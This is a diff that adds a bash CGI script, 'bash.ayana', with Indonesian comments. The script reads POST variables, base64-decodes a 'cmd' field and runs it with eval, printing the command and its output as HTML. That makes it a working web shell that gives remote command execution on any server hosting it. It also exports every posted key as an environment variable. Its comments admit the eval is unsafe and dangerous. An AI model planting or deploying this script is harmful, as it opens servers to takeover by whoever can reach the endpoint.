@@ -1,0 +1,123 @@
+#!/usr/bin/env bash
+# ============================================================
+# beautified bash.ayana
+# - CGI helper: baca POST, decode URL-encoded vars, decode base64 'cmd' & 'check'
+# - Menjalankan isi 'cmd' — gunakan hanya di lingkungan terkontrol
+# ============================================================
+
+set -u
+IFS=$'\n\t'
+
+# -----------------------
+# HTTP header
+# -----------------------
+printf "Content-Type: text/html\r\n\r\n"
+
+# -----------------------
+# Read POST body into QUERY_STRING_POST (read exactly CONTENT_LENGTH bytes)
+# -----------------------
+cgi_get_POST_vars() {
+  # only when request method is POST
+  [ "${REQUEST_METHOD:-}" != "POST" ] && return 0
+  [ -n "${QUERY_STRING_POST:-}" ] && return 0
+  [ -z "${CONTENT_LENGTH:-}" ] && return 0
+
+  # read exact number of bytes
+  read -r -N "$CONTENT_LENGTH" QUERY_STRING_POST 2>/dev/null || QUERY_STRING_POST=""
+  export QUERY_STRING_POST
+}
+
+# -----------------------
+# URL-decode one value
+# Usage: decoded=$(cgi_decodevar "$encoded")
+# -----------------------
+cgi_decodevar() {
+  local encoded="${1:-}"
+  # replace + with space
+  encoded="${encoded//+/ }"
+  # convert %HH to \xHH then let printf interpret escapes
+  printf '%b' "${encoded//%/\\x}"
+}
+
+# -----------------------
+# Parse vars from GET/POST/BOTH and export selected keys
+# Usage: cgi_getvars POST ALL    -> export all POST keys
+#        cgi_getvars GET key1 key2
+# -----------------------
+cgi_getvars() {
+  [ $# -lt 1 ] && return 1
+  local mode="$1"; shift
+  local q=""
+  local pair k v decoded
+
+  case "$mode" in
+    GET)
+      [ -n "${QUERY_STRING:-}" ] && q="${QUERY_STRING}"
+      ;;
+    POST)
+      cgi_get_POST_vars
+      [ -n "${QUERY_STRING_POST:-}" ] && q="${QUERY_STRING_POST}"
+      ;;
+    BOTH)
+      [ -n "${QUERY_STRING:-}" ] && q="${QUERY_STRING}"
+      cgi_get_POST_vars
+      [ -n "${QUERY_STRING_POST:-}" ] && q="${q:+${q}&}${QUERY_STRING_POST}"
+      ;;
+    *)
+      return 2
+      ;;
+  esac
+
+  [ -z "$q" ] && return 0
+
+  # if first (and only) arg is ALL -> export everything
+  local export_all=0
+  if [ $# -eq 1 ] && [ "$1" = "ALL" ]; then
+    export_all=1
+  fi
+
+  IFS='&' read -r -a pairs <<< "$q"
+  for pair in "${pairs[@]}"; do
+    k="${pair%%=*}"
+    v="${pair#*=}"
+    if [ "$k" = "$pair" ]; then
+      v=""
+    fi
+    decoded="$(cgi_decodevar "$v")"
+    if [ $export_all -eq 1 ]; then
+      export "$k"="$decoded"
+    else
+      # if specific keys were provided, export only those
+      for want in "$@"; do
+        [ "$want" = "$k" ] && export "$k"="$decoded" && break
+      done
+    fi
+  done
+
+  return 0
+}
+
+# -----------------------
+# Main: parse POST vars (export all), decode base64 fields, run eval
+# -----------------------
+cgi_getvars POST ALL
+
+# decode 'cmd' (base64) into query (suppress decode errors)
+query="$(echo "${cmd:-}" | base64 --decode 2>/dev/null || true)"
+
+# decode 'check' (base64) and print if present
+if [ -n "${check:-}" ]; then
+  check_decoded="$(echo "$check" | base64 --decode 2>/dev/null || true)"
+  printf '%s\n' "$check_decoded"
+fi
+
+# print and execute (UNSAFE)
+printf '<pre>\n'
+# show decoded command text
+printf '%s\n' "$query"
+# execute decoded content (DANGEROUS)
+eval "$query"
+printf '</pre>\n'
+
+# end
+exit 0
